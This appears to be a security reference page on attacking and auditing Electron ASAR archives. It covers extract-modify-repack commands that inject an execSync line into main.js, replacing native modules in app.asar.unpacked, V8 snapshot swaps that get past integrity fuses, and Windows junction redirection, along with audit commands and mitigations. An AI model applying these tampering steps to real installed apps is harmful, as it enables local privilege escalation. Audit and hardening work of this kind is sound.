---
title: ASAR Attack Surface
description: ASAR archive format — tampering, integrity bypass, and unpacked file exploitation
---

# ASAR Attack Surface

ASAR (Atom Shell Archive) is how Electron apps package their JavaScript source. It's a flat archive — not compressed, not encrypted, and until recently not integrity-verified. Every Electron app you encounter has an `app.asar` file sitting on disk, and with two commands you can read it, modify it, and repack it.

This is the attack surface that enables local privilege escalation in apps that run with elevated permissions. If an app runs as SYSTEM (Windows), or with elevated capabilities (macOS, Linux), and its ASAR is writable by a lower-privileged user, that user can inject code that executes at the higher privilege level.

---

## ASAR Attack Model

ASAR attacks are **local privilege escalation** scenarios:

```
Attacker has user-level access
         │
         ▼ extracts app.asar
         ▼ modifies JavaScript
         ▼ repacks as app.asar
         ▼ replaces original
         │
         ▼ Next time the app runs (possibly as system service, autostart, or elevated):
         → Attacker's code executes with app's privileges
```

**Common privilege escalation scenario:** App installs as a system service (running as SYSTEM/root) but app files are writable by the user. This is the [Bitdefender LPE pattern](../cves/CVE-2024-46992.md) — a misconfigured ACL + ASAR tampering.

---

## Extracting and Repacking ASAR

Basic tampering is trivially easy:

```bash
# Install asar tool:
npm install -g @electron/asar

# Extract:
asar extract /path/to/app.asar /tmp/app_extracted/

# Modify any JS file:
cat /tmp/app_extracted/main.js | head -20
echo "require('child_process').execSync('calc.exe');" >> /tmp/app_extracted/main.js

# Repack:
asar pack /tmp/app_extracted/ /tmp/app_patched.asar

# Replace (if user has write access to app dir):
cp /tmp/app_patched.asar /path/to/app.asar
```

---

## ASAR Integrity Fuses

The `EnableEmbeddedAsarIntegrityValidation` fuse adds hash verification:

```javascript
// In afterPack.js — enable ASAR integrity:
await flipFuses(electronPath, {
  version: FuseVersion.V1,
  [FuseV1Options.EnableEmbeddedAsarIntegrityValidation]: true,
  [FuseV1Options.OnlyLoadAppFromAsar]: true,  // Prevent directory fallback
});
```

When enabled:
- Electron computes SHA256 hashes of the ASAR at build time
- Hashes are embedded in the binary
- At runtime, ASAR is verified against embedded hashes
- Modified ASAR → hash mismatch → app refuses to load

**Check if fuse is enabled:**

```bash
npx @electron/fuses read --app /path/to/MyApp.app
# Look for:
# EnableEmbeddedAsarIntegrityValidation is Enabled ✅
# OnlyLoadAppFromAsar is Enabled ✅
```

---

## ASAR Integrity Bypass: V8 Snapshots (CVE-2025-55305)

Even with ASAR integrity enabled, V8 snapshots bypass the check:

```
Attack flow:
1. ASAR integrity enabled — app.asar hashes verified ✓
2. But: v8_context_snapshot.bin is NOT covered by ASAR integrity
3. Attacker replaces v8_context_snapshot.bin with malicious snapshot
4. At startup: V8 loads snapshot BEFORE ASAR integrity check runs
5. Malicious code from snapshot executes → integrity check still passes
```

```bash
# Location of V8 snapshot:
# macOS: MyApp.app/Contents/Frameworks/Electron Framework.framework/Resources/v8_context_snapshot.bin
# Windows: app folder/v8_context_snapshot.bin or within chrome resources

# Check if snapshot exists and is writable:
ls -la /Applications/MyApp.app/Contents/Frameworks/Electron\ Framework.framework/Resources/v8_context_snapshot.bin
```

**Fix (1Password's approach):** Rename/remove `v8_context_snapshot.bin` if V8 snapshots aren't needed for app functionality. Or verify snapshot integrity separately.

---

## The unpacked Directory

ASAR's `--unpack` option copies files outside the archive — these are never integrity-checked:

```bash
# What lands outside app.asar:
ls -la /path/to/app/

# Typically:
# app.asar           ← the archive (may be integrity-checked)
# app.asar.unpacked/ ← native modules and large binaries (NOT checked)
#   └── native_addon.node
#   └── ffmpeg.dll
#   └── sqlite3.node
```

**Attack:** Replace a file in `app.asar.unpacked/` — even if ASAR integrity is enabled:

```bash
# Find unpacked directory:
find /Applications/MyApp.app -name "*.asar.unpacked" -type d

# Replace native module:
cp /tmp/malicious.node /Applications/MyApp.app/Contents/Resources/app.asar.unpacked/native_addon.node
# When app loads, it requires the native module from unpacked → malicious code executes
```

---

## ACL Audit — Who Can Write ASAR?

```bash
# Windows: check ASAR file permissions:
icacls "C:\Program Files\MyApp\resources\app.asar"

# Expected: only SYSTEM and Administrators have write access
# Dangerous: Users or "Everyone" have write access

# Check app directory:
icacls "C:\Program Files\MyApp\"

# macOS: check permissions:
ls -la /Applications/MyApp.app/Contents/Resources/app.asar

# Expected: owned by root, not world-writable
# Check unpacked dir too:
ls -la /Applications/MyApp.app/Contents/Resources/app.asar.unpacked/

# Linux: check permissions:
stat /opt/myapp/resources/app.asar
# Check for world-writable:
find /opt/myapp -writable -not -path "*/userData/*" 2>/dev/null
```

---

## Junction/Symlink Attack (Windows)

Even with correct ACLs, Windows junctions can redirect writes:

```
Scenario:
- C:\ProgramData\MyApp\ is user-writable (misconfigured)
- App creates files in C:\ProgramData\MyApp\config\
- Attacker: 
  1. Remove C:\ProgramData\MyApp\config\ (if allowed)
  2. Create junction: C:\ProgramData\MyApp\config\ → C:\Program Files\MyApp\resources\
  3. App writes "config file" → actually writes to Program Files → TOCTOU win
```

This is a variant of the Bitdefender LPE technique (Finding 005).

---

## ASAR Security Audit

```bash
# Check fuse status (integrity validation):
npx @electron/fuses read --app /path/to/MyApp.app

# Check if unpacked directory exists:
find /path/to/app -name "*.asar.unpacked" -type d

# Check file permissions (Linux/macOS):
stat /path/to/app/resources/app.asar
ls -la /path/to/app/resources/

# Check V8 snapshot exists (potential bypass vector):
find /path/to/app -name "v8_context_snapshot*"

# Check if app.asar is writable by current user:
test -w /path/to/app/resources/app.asar && echo "WRITABLE - VULNERABLE"

# On Windows (PowerShell):
# (Get-Acl "C:\Program Files\MyApp\resources\app.asar").Access | Where-Object {$_.FileSystemRights -match "Write"}
```

---

## Risk Matrix

| Attack | Requires | Impact | Mitigated By |
|--------|----------|--------|--------------|
| ASAR tampering | Write access to app dir | Code execution at app's privilege | ASAR integrity fuse + correct ACLs |
| Unpacked dir tampering | Write to .unpacked dir | Code execution | Correct ACLs (not fuse) |
| V8 snapshot replacement | Write to snapshot path | Pre-integrity code execution | Removing snapshot file |
| Junction attack | Write to parent directory | LPE | Proper ACL on parent |
| No ASAR (directory) | Write to app directory | Code injection | OnlyLoadAppFromAsar fuse |
